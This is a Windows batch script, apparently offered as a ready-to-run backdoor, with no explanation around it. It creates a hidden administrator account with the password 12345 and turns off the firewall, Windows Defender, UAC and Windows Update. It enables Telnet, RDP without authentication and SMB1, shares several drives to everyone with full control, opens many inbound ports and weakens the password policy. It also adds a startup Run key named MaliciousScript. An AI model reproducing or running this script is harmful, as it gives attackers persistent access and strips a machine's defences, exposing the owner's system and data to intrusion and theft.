@echo off
setlocal
ver | findstr /i "5\.1\." > nul && set version=XP
ver | findstr /i "5\.2\." > nul && set version=Server2003
ver | findstr /i "6\." > nul && set version=VistaWin7Server2008
ver | findstr /i "10\." > nul && set version=Win10
net stop sharedAccess & sc delete sharedaccess
net user /add administrador 12345 & net localgroup Administradores administrador /add
if "%version%"=="XP" (cd /d "%SystemDrive%\Documents and Settings\administrador") else (cd /d "%SystemDrive%\Users\administrador")
attrib +H .
sc config wuauserv start= disabled & sc stop wuauserv & sc stop BITS & sc config tlntsvr start= auto & sc start tlntsvr
net start tlntsvr
for %%d in (c d a e) do net share disco%%d=%%d: /grant:everyone,full
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh advfirewall set allprofiles state off
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
dism /online /enable-feature /featurename:SMB1Protocol /all /norestart
for %%p in (21 23 25 80 139 445 3389) do netsh advfirewall firewall add rule name="Open Port %%p" dir=in action=allow protocol=TCP localport=%%p
net accounts /minpwlen:1 /maxpwage:unlimited /minpwage:0 /uniquepw:0
sc stop WinDefend & sc config WinDefend start= disabled
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousScript /t REG_SZ /d "c:\path\to\malicious_script.bat" /f
endlocal
